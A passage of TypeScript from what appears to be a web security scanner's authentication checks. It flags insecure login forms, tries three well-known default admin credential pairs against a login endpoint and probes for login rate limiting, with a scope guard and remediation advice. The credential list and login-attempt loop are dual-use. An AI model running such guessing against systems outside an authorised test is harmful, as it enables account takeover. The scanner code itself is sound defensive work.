          dedupeKey: "auth-form-get",
        });
      }
      if (form.action.startsWith("http://")) {
        findings.push({
          title: "Login form posts over plaintext HTTP",
          severity: "high",
          category: "transport",
          confidence: "confirmed",
          tool: "argus-auth",
          url: form.action,
          evidence: `Form action: ${form.action}`,
          description: "Credentials sent over HTTP can be read or modified by anyone on the network path.",
          remediation: "Serve the login page and form action over HTTPS only, with HSTS enabled.",
          references: ["https://owasp.org/www-community/Transport_Layer_Protection"],
          cwe: "CWE-319",
          dedupeKey: "auth-form-http",
        });
      }
      const hasToken = Object.keys(form.fields).some((key) => /csrf|xsrf|authenticity|token/i.test(key));
      if (!hasToken && form.method === "post") {
        findings.push({
          title: "Login form has no anti-CSRF token",
          severity: "low",
          category: "session",
          confidence: "possible",
          tool: "argus-auth",
          url: form.action,
          evidence: `POST fields: ${Object.keys(form.fields).join(", ") || "none"}\nNo CSRF/XSRF field was present.`,
          description: "Without a CSRF token or strict SameSite cookies, an attacker may be able to log a victim into an attacker-controlled account (login CSRF).",
          remediation: "Add a per-session CSRF token and set SameSite=Lax or Strict on session cookies.",
          references: ["https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"],
          cwe: "CWE-352",
          dedupeKey: "auth-login-csrf",
        });
      }
      return findings;
    },
  },
  {
    id: "auth-defaults",
    label: "Default credentials & login throttling",
    phase: "audit",
    requiresActive: true,
    requiresIntrusive: true,
    run: async (ctx) => {
      const page = await baseline(ctx);
      if (!page) return;
      const form = await findLoginForm(ctx, page.body, page.finalUrl);
      if (!form) return;
      // Never send credentials to an identity provider or host outside the
      // authorization, even when the login form points at one.
      if (!ctx.guard.checkUrl(form.action).allowed) {
        ctx.log("info", `Default-credential check skipped: login action is outside scope (${form.action})`, "auth");
        return;
      }
      const findings: FindingDraft[] = [];
      const attempts = [
        ["admin", "admin"],
        ["admin", "password"],
        ["admin", "admin123"],
      ] as const;
      let accepted: { user: string; password: string; status: number } | undefined;
      let throttled = false;
      for (const [user, password] of attempts) {
        if (ctx.signal.aborted) break;
        const body = credentialsBody(form, user, password);
        try {
          const response = await ctx.http.post(form.action, body, {
            headers: { "content-type": "application/x-www-form-urlencoded" },
            followRedirects: false,
            maxBodyBytes: 300_000,
          });
          if (response.status === 429 || response.status === 423) throttled = true;
          if (looksLoggedIn(response)) {
            accepted = { user, password, status: response.status };
            break;
          }
        } catch {
          // a failed login attempt is not a scan error
        }
      }
      if (accepted) {
        findings.push({
          title: "Default administrative credentials accepted",
          severity: "critical",
          category: "authentication",
          confidence: "confirmed",
          tool: "argus-auth",
          url: form.action,
          evidence: `Login endpoint: ${form.action}\nAccepted username: ${accepted.user}\nPassword: a well-known default (redacted)\nStatus: ${accepted.status}`,
          metadata: { username: accepted.user, passwordClass: "well-known default" },
          description: "A well-known default credential pair authenticated successfully. Anyone who can reach the login page can take over the account.",
          remediation: "Disable default accounts, force a password change on first login, and add MFA for administrative access.",
          references: ["https://cwe.mitre.org/data/definitions/1392.html"],
          cwe: "CWE-1392",
          dedupeKey: "auth-default-credentials",
        });
      }
      if (!accepted && !throttled) {
        const probeUser = `argus-probe-${Math.random().toString(36).slice(2, 10)}@example.invalid`;
        let blocked = false;
        let attemptsRun = 0;
        for (let index = 0; index < 6; index += 1) {
          if (ctx.signal.aborted) break;
          attemptsRun += 1;
          try {
            const response = await ctx.http.post(form.action, credentialsBody(form, probeUser, `wrong-${index}-${Math.random().toString(36).slice(2, 8)}`), {
              headers: { "content-type": "application/x-www-form-urlencoded" },
              followRedirects: false,
              maxBodyBytes: 200_000,
            });
            if (response.status === 429 || response.status === 423 || /rate.?limit|too many|captcha|locked/i.test(response.body)) {
              blocked = true;
              break;
            }
          } catch {
            break;
          }
        }
        if (attemptsRun >= 3 && !blocked) {
          findings.push({
            title: "No login throttling observed",
            severity: "low",
            category: "authentication",
            confidence: "possible",
            tool: "argus-auth",
            url: form.action,
            evidence: `${attemptsRun} failed logins for a non-existent account were accepted without a 429, lockout or CAPTCHA response.`,
            description: "The login endpoint did not visibly rate-limit repeated failures during a small controlled probe. This permits slower password guessing and account enumeration.",
            remediation: "Add per-account and per-IP rate limiting, exponential backoff, CAPTCHA after repeated failures, and alerting on credential stuffing.",
            references: ["https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"],
            cwe: "CWE-307",
            dedupeKey: "auth-no-throttle",
          });
        }
      }
      return findings;
    },
  },
];
